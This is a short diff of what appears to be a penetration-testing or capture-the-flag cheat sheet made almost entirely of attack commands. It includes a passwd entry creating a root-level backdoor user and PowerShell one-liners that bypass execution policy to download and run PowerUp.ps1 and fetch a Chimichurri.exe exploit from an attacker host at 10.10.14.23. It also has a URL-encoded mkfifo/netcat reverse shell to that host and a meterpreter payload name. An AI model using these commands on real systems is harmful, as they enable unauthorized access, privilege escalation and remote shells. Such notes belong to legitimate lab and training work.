@@ -4,7 +4,7 @@ firefart:fib/tLwcEGsC2:0:0:pwned:/root:/bin/bash
 windows/meterpreter/reverse_tcp_allports
 
 powershell -version 2 -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23:8000/PowerUp.ps1'); Invoke-AllChecks"
-
+powershell.exe -exec Bypass -C " (new-object System.Net.WebClient).Downloadfile('http://10.10.14.23:8000/Chimichurri.exe', 'C:\users\tolis\Chimichurri.exe')"
 
 netcat URL encoded rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.23+1234+>/tmp/f
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
